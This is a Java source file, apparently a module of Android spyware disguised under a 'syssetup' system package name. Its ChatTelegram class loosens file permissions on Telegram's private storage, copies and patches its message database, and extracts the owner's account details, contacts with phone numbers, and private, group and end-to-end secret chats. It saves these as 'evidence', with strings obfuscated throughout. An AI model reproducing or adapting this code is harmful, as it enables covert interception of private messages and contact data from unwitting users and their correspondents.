package com.android.syssetup.module.chat;

import android.database.Cursor;
import android.database.sqlite.SQLiteDatabaseCorruptException;
import android.util.Base64;

import com.android.syssetup.auto.Cfg;
import com.android.syssetup.db.GenericSqliteHelper;
import com.android.syssetup.db.RecordHashPairVisitor;
import com.android.syssetup.db.RecordVisitor;
import com.android.syssetup.file.Path;
import com.android.syssetup.module.ModuleAddressBook;
import com.android.syssetup.util.Check;
import com.android.syssetup.util.StringUtils;
import com.android.mm.M;

import org.apache.http.util.EncodingUtils;
import org.w3c.dom.Document;
import org.w3c.dom.NamedNodeMap;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;
import org.xml.sax.SAXException;

import java.io.File;
import java.io.IOException;
import java.io.RandomAccessFile;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.nio.MappedByteBuffer;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.List;
import java.util.concurrent.Semaphore;

import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;

public class ChatTelegram extends SubModuleChat {
	public class TelegramConversation {

		protected Account account;
		protected long uid;
		protected String name;

		protected List<Integer> participants = new ArrayList<Integer>();
		protected String title;

	}

	public class Account {

		public int id;
		public String name;
		public String last_name;

		public String getName() {
			return (name + " " + last_name).trim().toLowerCase();
		}
	}

	private static final String TAG = "ChatTelegram";

	private static final int PROGRAM = 0x0e; // anche per addressbook

	String pObserving = M.e("org.telegram.messenger");
	String dbFile = M.e("/data/data/org.telegram.messenger/files/cache4.db");
	String dbAccountFile = M.e("/data/data/org.telegram.messenger/shared_prefs/userconfing.xml");

	private Date lastTimestamp;

	private long lastTelegram;
	Semaphore readChatSemaphore = new Semaphore(1, true);

	private Account account;

	//private GenericSqliteHelper helper;

	private boolean firstTime = true;

	private boolean started;

	private boolean old_format_chat=true;
	// private ByteBuffer in;

	@Override
	public int getProgramId() {
		return PROGRAM;
	}

	@Override
	String getObservingProgram() {
		return pObserving;
	}

	@Override
	void notifyStopProgram(String processName) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (notifyStopProgram) ");
		}
		updateHistory(false);
	}

	@Override
	protected boolean frequentNotification(String processInfo) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (frequentNotification) ");
		}
		updateHistory(true);
		return true;
	}

	private void updateHistory(boolean fast) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (updateHistory) " + fast);
		}

		if (!started || !readChatSemaphore.tryAcquire()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (updateHistory), semaphore red");
			}
			return;
		}
		GenericSqliteHelper helper = openCopy(dbFile);

		try {
			if (helper == null) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (updateHistory) cannot open db");
				}
				return;
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " (start), read lastTelegram: " + lastTelegram);
			}

			if (Cfg.DEBUG) {
				Check.asserts(account != null, " (updateHistory) Assert failed, null account");
			}

			long lastmessage = readTelegramChatHistory(helper, fast);

			if (lastmessage > lastTelegram) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (start) serialize: %d", lastmessage);
				}
				markup.serialize(lastmessage);
				lastTelegram = lastmessage;
			}

		} catch (Exception e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (updateHistory) Error: " + e);
			}
		} finally {
			if (helper != null) {
				helper.disposeDb();
			}
			readChatSemaphore.release();
		}
	}

	@Override
	protected void start() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (start) ");
		}

		if (!readChatSemaphore.tryAcquire()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (start), semaphore red");
			}
			return;
		}

		try {

			lastTelegram = markup.unserialize(new Long(0));
			if (Cfg.DEBUG) {
				Check.log(TAG + " (start), read lastTelegram: " + lastTelegram);
			}


			GenericSqliteHelper helper = openCopy(dbFile);
			if (helper == null) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (start) cannot open db");
				}
				return;
			}
			try {
				Path.unprotect(dbAccountFile, 3, true);
				account = readAddressContacts(helper);
				long lastmessage = readTelegramChatHistory(helper, false);

				if (lastmessage > lastTelegram) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (start) serialize: %d", lastmessage);
					}
					markup.serialize(lastmessage);
					lastTelegram = lastmessage;
				}
			} finally {
				helper.disposeDb();
			}
			started = true;

		} catch (Exception e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (start) Error: " + e);
			}
		} finally {
			readChatSemaphore.release();
		}

	}

	public static int truncatedEquals(byte[] buffer, int start, byte[] pattern, int offset) {

		int upperBound = Math.min(buffer.length - start, pattern.length - offset);
		for (int i = 0; i < upperBound; i++) {
			if (buffer[i + start] != pattern[i + (offset)]) {
				return i;
			}
		}
		return upperBound;
	}

	private synchronized GenericSqliteHelper openCopy(String dbFile) {
		byte[] buf = new byte[1024 * 20];

		String matchString = M.e("WHERE mid < 0 AND send_state = 1");
		byte[] match = EncodingUtils.getAsciiBytes(matchString);
		byte[] replace = new byte[match.length];

		Arrays.fill(replace, (byte) ' ');

		if (Cfg.DEBUG) {
			Check.asserts(matchString.length() == replace.length, " (openCopy) wrong size");
		}

		File fs = new File(dbFile);
		dbFile = fs.getAbsolutePath();
		if (!(Path.unprotect(dbFile, 4, false) && fs.exists() && fs.canRead())) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (openCopy) ERROR: no suitable db file");
			}
			return null;
		}

		String localFile = Path.markup() + fs.getName();
		File local = new File(localFile);


		try {
			RandomAccessFile source = new RandomAccessFile(fs.getAbsoluteFile(), M.e("r"));
			RandomAccessFile dest = new RandomAccessFile(local.getAbsoluteFile(), M.e("rw"));

			int len, prevMatch = 0, actualMatch = 0;
			int sizeToMatch = matchString.length();
			boolean found = false;
			long offsetOfNextOffset = source.getFilePointer();
			boolean skipOneRound = false;
			while ((len = source.read(buf)) > 0) {
				for (int i = 0; !found && i < len; i++) {
					actualMatch = truncatedEquals(buf, i, match, prevMatch);
					if (((actualMatch + prevMatch) == sizeToMatch)) {
						offsetOfNextOffset -= prevMatch;
						dest.seek(offsetOfNextOffset);
						dest.write(buf, 0, i);
						dest.write(replace);
						source.seek(dest.getFilePointer());

						found = true;
						skipOneRound = true;
						break;
					}
					if (actualMatch > 0) {

						prevMatch = actualMatch;
						i += actualMatch;
					} else {
						prevMatch = 0;
					}
				}
				if (skipOneRound == false) {
					dest.write(buf, 0, len);
				} else {
					skipOneRound = false;
				}
				offsetOfNextOffset = source.getFilePointer();
			}

			if (Cfg.DEBUG) {
				Check.asserts(source.length() == dest.length(), "File length do not match");
				Check.asserts(source.getFilePointer() == dest.getFilePointer(), "File size do not match");
			}

			source.close();
			dest.close();

		} catch (IOException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (openCopy), error: " + e);
			}
			return null;
		}

		GenericSqliteHelper helper = new GenericSqliteHelper(localFile, true);
		return helper;
	}

	private String fixThreeSemicolons(String name){
		if(name!=null){
			if (name.endsWith(M.e(";;;"))) {
				name = name.substring(0, name.length() - 3);
			}
		}
		return name;
	}
	private Account readAddressContacts(GenericSqliteHelper helper) throws SAXException, IOException, ParserConfigurationException {

		account = readMyPhoneNumber(dbAccountFile);
		ModuleAddressBook.createEvidenceLocal(ModuleAddressBook.TELEGRAM, account.getName());
		if (ModuleAddressBook.getInstance() != null) {
			String sqlquery = M.e("SELECT c.uid,c.fname, s.phone FROM user_contacts_v6 AS c JOIN user_phones_v6 AS s ON c.uid = s.uid");
			RecordVisitor visitor = new RecordVisitor() {

				@Override
				public long cursor(Cursor cursor) {
					int uid =  cursor.getInt(0);
					String name = cursor.getString(1).trim();
					name= fixThreeSemicolons(name);
					String phone = cursor.getString(2).trim();
					Contact contact = new Contact(""+uid, name, name, phone);
					ModuleAddressBook.createEvidenceRemote(ModuleAddressBook.TELEGRAM, contact);
					return uid;
				}


			};
			helper.traverseRawQuery(sqlquery, null, visitor);
		}
		return account;
	}
	private Account readAddressContacts_old(GenericSqliteHelper helper) throws SAXException, IOException, ParserConfigurationException {
		account = readMyPhoneNumber(dbAccountFile);
		ModuleAddressBook.createEvidenceLocal(ModuleAddressBook.TELEGRAM, account.getName());

		if (ModuleAddressBook.getInstance() != null) {

			RecordVisitor visitor = new RecordVisitor(null, null) {
				@Override
				public long cursor(Cursor cursor) {
					int uid = cursor.getInt(0);
					String name = cursor.getString(1).trim();
					byte[] data = cursor.getBlob(3);

					ByteBuffer in = MappedByteBuffer.wrap(data);
					Integer id = readInt32(in);
					Integer id2 = readInt32(in);
					String first_name = readString(in);
					String last_name = readString(in);
					String phone = readString(in);

					Contact contact = new Contact(id.toString(), name, name, phone);
					ModuleAddressBook.createEvidenceRemote(ModuleAddressBook.TELEGRAM, contact);

					return uid;
				}
			};

			helper.traverseRecords(M.e("users"), visitor);
		}

		return account;
	}

	private Account readMyPhoneNumber(String filename) throws SAXException, IOException, ParserConfigurationException {
		// <string
		// name="user">7DUFct14eQIERWRkeQAAAAdXYXJsb2NrDDM5MzM4Njk1NTIwNAAAAOG6EU8/cIwAOWtIUzeXebw=</string>
		// base64
		File file = new File(filename);
		Document doc = DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(file);
		doc.getDocumentElement().normalize();
		NodeList stringNodes = doc.getElementsByTagName("string");

		String data64;
		byte[] data = null;

		for (int i = 0; i < stringNodes.getLength(); i++) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readMyPhoneNumber), node: " + i);
			}
			Node node = stringNodes.item(i);
			NamedNodeMap attrs = node.getAttributes();
			Node item = attrs.getNamedItem("name");
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readMyPhoneNumber), item: " + item.getNodeName() + " = " + item.getNodeValue());
			}

			if (item != null && M.e("user").equals(item.getNodeValue())) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (readMyPhoneNumber), found number: " + item);
				}
				data64 = node.getFirstChild().getNodeValue();
				data = Base64.decode(data64, Base64.DEFAULT);

			}
		}

		Account account = new Account();
		ByteBuffer in = MappedByteBuffer.wrap(data);
		int con = readInt32(in);
		account.id = readInt32(in);
		account.name = readString(in);
		account.last_name = readString(in);

		return account;
	}

	@Override
	protected void stop() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (stop), ");
		}
	}

	private long readTelegramChatHistory(GenericSqliteHelper helper, boolean fast) {

		try {
			long lastmessageP = 0, lastmessageG = 0;
			long lastmessageS = readTelegramSecureChatHistory(helper);
			if (!fast) {
				lastmessageP = readTelegramPlainChatHistory(helper);
				lastmessageG = readTelegramGroupChatHistory(helper);
			}

			return Math.max(lastmessageS, Math.max(lastmessageP, lastmessageG));
		} catch (SQLiteDatabaseCorruptException ex) {
			enabled = false;
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readTelegramMessageHistory) Error: ", ex);
			}
			return 0;
		} catch (Exception ex) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readTelegramMessageHistory) Error: ", ex);
			}
			return 0;
		}

	}

	private long readTelegramPlainChatHistory(GenericSqliteHelper helper) {
		try {

			String sqlquery = M.e("SELECT date, m.data, out, name  FROM messages as m  INNER JOIN users as u on m.uid = u.uid where date > ? order by date ");

			final ArrayList<MessageChat> messages = new ArrayList<MessageChat>();

			MessageRecordVisitor visitor = new MessageRecordVisitor(messages);
			long lastmessage = helper.traverseRawQuery(sqlquery, new String[]{Long.toString(lastTelegram)}, visitor);

			if (!messages.isEmpty()) {
				getModule().saveEvidence(messages);
			}
			return lastmessage;

		} catch (Exception ex) {
			if (Cfg.DEBUG) {

				Check.log(TAG + " (readTelegramMessageHistory) Error: ", ex);
			}
		}
		return lastTelegram;

	}

	private long readTelegramSecureChatHistory(GenericSqliteHelper helper) {

		String sqlquery = M.e("SELECT  m.date, m.data, m.out, q.name FROM enc_chats as q INNER JOIN users as u ON q.user = u.uid INNER JOIN messages as m ON (q.uid << 32) = m.uid WHERE m.date > ? order by m.date");

		final ArrayList<MessageChat> messages = new ArrayList<MessageChat>();
		MessageRecordVisitor visitor = new MessageRecordVisitor(messages);

		long lastmessage = helper.traverseRawQuery(sqlquery, new String[]{Long.toString(lastTelegram)}, visitor);

		if (!messages.isEmpty()) {
			getModule().saveEvidence(messages);
		}
		return lastmessage;
	}

	private long readTelegramGroupChatHistory(GenericSqliteHelper helper) {
		RecordHashPairVisitor users = new RecordHashPairVisitor(M.e("uid"), M.e("name"));
		helper.traverseRecords("users", users);
		final ChatGroups groups = new ChatGroups();
		List<TelegramConversation> conversations = getTelegramGroups(helper, users, groups);

		long maxLast = 0;
		for (TelegramConversation tc : conversations) {
			String sqlquery = M.e("SELECT date, data, out, uid  FROM messages as m  where date > ? and uid = ? order by date ");

			final ArrayList<MessageChat> messages = new ArrayList<MessageChat>();

			MessageGroupVisitor visitor = new MessageGroupVisitor(messages, groups, users);
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readTelegramGroupChatHistory) uid: " + Long.toString(-tc.uid));
			}
			long lastmessage = helper.traverseRawQuery(sqlquery,
					new String[]{Long.toString(lastTelegram), Long.toString(-tc.uid)}, visitor);

			if (!messages.isEmpty()) {
				getModule().saveEvidence(messages);
			}

			maxLast = Math.max(lastmessage, maxLast);
		}

		return maxLast;
	}

	private List<TelegramConversation> getTelegramGroups(GenericSqliteHelper helper, final RecordHashPairVisitor users,
	                                                     final ChatGroups groups) {

		final List<TelegramConversation> conversations = new ArrayList<TelegramConversation>();

		String sqlquery = M.e("SELECT c.uid,c.name,c.data,s.participants FROM chats AS c JOIN chat_settings AS s ON c.uid = s.uid");

		RecordVisitor visitor = new RecordVisitor() {

			@Override
			public long cursor(Cursor cursor) {
				TelegramConversation c = new TelegramConversation();
				c.account = account;

				c.uid = cursor.getLong(0);
				c.name = cursor.getString(1);
				byte[] data = cursor.getBlob(2);
				byte[] participants = cursor.getBlob(3);

				if (Cfg.DEBUG) {
					Check.log(TAG + " (cursor) data " + StringUtils.byteArrayToHexString(data));
					Check.log(TAG + " (cursor) participants " + StringUtils.byteArrayToHexString(participants));
				}

				unWrapChat(c, data);
				unWrapParticipants(c, participants);

				conversations.add(c);

				return c.uid;
			}

			private void unWrapParticipants(TelegramConversation c, byte[] participants) {
				ByteBuffer in = MappedByteBuffer.wrap(participants);
				in.order(ByteOrder.LITTLE_ENDIAN);

				int constructor = readInt32(in);
				int id = readInt32(in);
				int admin_id = readInt32(in);
				readInt32(in);
				int count = readInt32(in);
				for (int a = 0; a < count; a++) {
					int part_const = readInt32(in);
					int part_id = readInt32(in);
					int part_initer = readInt32(in);
					int part_date = readInt32(in);

					String sid = Integer.toString(part_id);
					String name = users.get(sid);
					c.participants.add(part_id);
					groups.addPeerToGroup(Long.toString(c.uid), new Contact(sid, name));
				}
				int version = readInt32(in);
				boolean b = in.hasRemaining();
				if (Cfg.DEBUG) {
					Check.asserts(b == false, " (cursor) Assert failed, still remaining");
				}
			}

			private void unWrapChat(TelegramConversation c, byte[] data) {
				ByteBuffer in = MappedByteBuffer.wrap(data);
				int constructor = readInt32(in);
				int id = readInt32(in);
				String title = readString(in);
				int photo = readInt32(in);
				int participant_count = readInt32(in);
				int date = readInt32(in);
				boolean left = readBool(in);

				int version = readInt32(in);
				boolean b = in.hasRemaining();
				if (Cfg.DEBUG) {
					Check.asserts(b == false, " (cursor) Assert failed, still remaining");
				}

				c.title = title;
			}
		};

		helper.traverseRawQuery(sqlquery, null, visitor);

		if (Cfg.DEBUG) {
			for (String group : groups.getAllGroups()) {
				String to = groups.getGroupToName(account.getName(), group);
				Check.log(TAG + " (getTelegramGroups group) %s : %s", group, to);
			}
		}

		return conversations;
	}
	private ArrayList<String> getContentFromBlob(byte[] data) {
	// take long run decision on content!=null isn't safe we check it again avery time
		old_format_chat=true;
		ByteBuffer in = MappedByteBuffer.wrap(data);
			/* 0xbc799737 0x37,0x97, 0x79, 0xbc
			44 byte telegram 2.0.5 NON funziona
					0xb3, 0x99, 0x76, 0x56,
					0x03, 0x00, 0x00, 0x00,
					0xa8, 0xcb, 0xfc, 0xff,
					0x09, 0x14, 0x79, 0x04,
					0x6d, 0xbc, 0xb1, 0x9d,
					0x75, 0x88, 0xdf, 0x03,
					0x8b, 0x4e, 0x7c, 0x54,
					0x05,
					0x41, 0x41, 0x41, 0x41, 0x41, 0x00, 0x00, 0x20, 0x63, 0xed, 0x3d, 0x00, 0x00, 0x00, 0x00,

					48 byte telegram 1.4.9 funziona
					0xba, 0x6a, 0xeb, 0x22,
					0x62, 0xcb, 0xfc, 0xff,
					0xdd, 0x78, 0x79, 0x02,
					0xbb, 0xe5, 0xd0, 0xba,
					0xa2, 0x64, 0x2c, 0x00,
					0xb5, 0x75, 0x72, 0x99, boolean 0x997275b5 == true == 0xb5, 0x75, 0x72, 0x99
					0xb5, 0x75, 0x72, 0x99, boolean 0x997275b5 == true
					0x83, 0x78, 0x7c, 0x54,
					0x05,
					0x41, 0x41, 0x41, 0x41, 0x41, 0x00, 0x00, 0x20, 0x63, 0xed, 0x3d, 0x00, 0x00, 0x00, 0x00,
			*/
		int con;
		int id = 0;
		int from_id = 0;
		int to_id;
		int to_id2;
		boolean out;
		boolean unread;
		int m_date;
		String content = null;

		con = readInt32(in);
		id = readInt32(in);
		from_id = readInt32(in);
		to_id = readInt32(in);
		to_id2 = readInt32(in);
		out = readBool(in);
		int unread_bool_pos=in.position();
		unread = readBool(in);
		m_date = readInt32(in);
		content = readString(in);
		ArrayList<String> res = new ArrayList<String>();
		res.add(0, content);
		res.add(1, Integer.toString(id));
		res.add(2, Integer.toString(from_id));
		res.add(3, Integer.toString(from_id));
		res.add(4, Integer.toString(to_id2));
		if (content == null) {
			/* try again with 44 byte remove unread...*/
			in.position(unread_bool_pos);
			unread = false;
			m_date = readInt32(in);
			content = readString(in);
			if (content != null) {
			// take long run decision on content!=null isn't safe we check it again avery time
				old_format_chat = false;
				res.remove(3);
				res.add(3, Integer.toString(to_id));
				res.remove(0);
				res.add(0, content);
				if (Cfg.DEBUG) {
					Check.log(TAG + " (getContentFromBlob) Switching to new Format chat");
				}
			}
		}
		if (!StringUtils.isEmpty(content)) {
			return res;
		} else {
			return null;
		}
	}
	public class MessageGroupVisitor extends RecordVisitor {

		private ArrayList<MessageChat> messages;
		private ChatGroups groups;
		private RecordHashPairVisitor users;

		public MessageGroupVisitor(ArrayList<MessageChat> messages, ChatGroups groups, RecordHashPairVisitor users) {
			this.messages = messages;
			this.groups = groups;
			this.users = users;
		}

		@Override
		public long cursor(Cursor cursor) {
			long created_time = cursor.getLong(0);
			Date date = new Date(created_time * 1000);

			byte[] data = cursor.getBlob(1);
			boolean incoming = cursor.getInt(2) == 0;
			// localtime or gmt? should be converted to gmt

			int uid = cursor.getInt(3);
			String sid = Integer.toString(-uid);

			ArrayList<String> parsedBlob = getContentFromBlob(data);

			if (parsedBlob!=null && parsedBlob.size()>=5 && !StringUtils.isEmpty(parsedBlob.get(0))) {
				String to, from;
				if (incoming) {
					from = users.get(parsedBlob.get(3));
					to = groups.getGroupToName(from, sid);
				} else {
					to = groups.getGroupToName(account.getName(), sid);
					from = account.getName();
				}

				if (Cfg.DEBUG) {
					Check.log(TAG + " (readTelegramMessageHistory) %s\n%s, %s -> %s: %s ", parsedBlob.get(1), date.toLocaleString(),
							from, to, parsedBlob.get(0));
				}
				if(old_format_chat == false){
				/* user names in users table end iwith three ';'
				 * so in case the version of the db is the new one
				 * we strip them to have a good looking evicence
				**/
					if (from.endsWith(M.e(";;;"))) {
						from = from.substring(0, from.length() - 3);
					}
					if (to.endsWith(M.e(";;;"))) {
						to = to.substring(0, to.length() - 3);
					}
					to = to.replaceAll(M.e(";;;,"),",");
					from = from.replaceAll(M.e(";;;,"),",");
				}
				MessageChat message = new MessageChat(PROGRAM, date, from, to, parsedBlob.get(0), incoming);
				messages.add(message);
			}
			return created_time;
		}
	}

	class MessageRecordVisitor extends RecordVisitor {
		private ArrayList<MessageChat> messages;

		public MessageRecordVisitor(ArrayList<MessageChat> messages) {
			this.messages = messages;
		}

		@Override
		public long cursor(Cursor cursor) {
			long created_time = cursor.getLong(0);
			Date date = new Date(created_time * 1000);

			byte[] data = cursor.getBlob(1);
			boolean incoming = cursor.getInt(2) == 0;
			// localtime or gmt? should be converted to gmt
			String name = cursor.getString(3);

			String to, from;
			if (incoming) {
				to = account.getName();
				from = name;
			} else {
				to = name;
				from = account.getName();
			}
			ArrayList<String> parsedBlob = getContentFromBlob(data);
			if (parsedBlob!=null && parsedBlob.size()>=3 && !StringUtils.isEmpty(parsedBlob.get(0))) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (readTelegramMessageHistory) %s\n%s, %s -> %s: %s ", parsedBlob.get(1), date.toLocaleString(),
							from, to, parsedBlob.get(0));
				}
				if(old_format_chat == false) {
								/* user names in users table end iwith three ';'
				 * so in case the version of the db is the new one
				 * we strip them to have a good looking evicence 
				**/
					if (from.endsWith(M.e(";;;"))) {
						from = from.substring(0, from.length() - 3);
					}
					if (to.endsWith(M.e(";;;"))) {
						to = to.substring(0, to.length() - 3);
					}
				}
				MessageChat message = new MessageChat(PROGRAM, date, from, to, parsedBlob.get(0), incoming);
				messages.add(message);
				}

			return created_time;
		}
	}

	public String readString(ByteBuffer in) {
		try {
			in.order(ByteOrder.LITTLE_ENDIAN);
			int sl = 1;
			int l = in.get();
			if (l >= 254) {
				l = in.get() | (in.get() << 8) | (in.get() << 16);
				sl = 4;
			}
			byte[] b = new byte[l];
			in.get(b);
			int i = sl;
			while ((l + i) % 4 != 0) {
				in.get();
				i++;
			}
			return new String(b, M.e("UTF-8"));
		} catch (Exception x) {

		}
		return null;
	}

	public int readInt32(ByteBuffer in) {

		try {

			in.order(ByteOrder.LITTLE_ENDIAN);
			return in.getInt();

		} catch (Exception x) {

		}
		return 0;
	}

	public long readInt64(ByteBuffer in) {
		try {
			in.order(ByteOrder.LITTLE_ENDIAN);
			return in.getLong();
			/*
			 * long i = 0; for (int j = 0; j < 8; j++) { i |= ((long) in.get()
			 * << (j * 8)); }
			 * 
			 * return i;
			 */
		} catch (Exception x) {

		}
		return 0;
	}

	public boolean readBool(ByteBuffer in) {
		int consructor = readInt32(in);
		if (consructor == 0x997275b5) {
			return true;
		} else if (consructor == 0xbc799737) {
			return false;
		} else {
			if (Cfg.DEBUG) {
				Check.asserts(false, " (readBool) Assert failed, strange value: " + consructor);
			}
		}

		return false;
	}

}
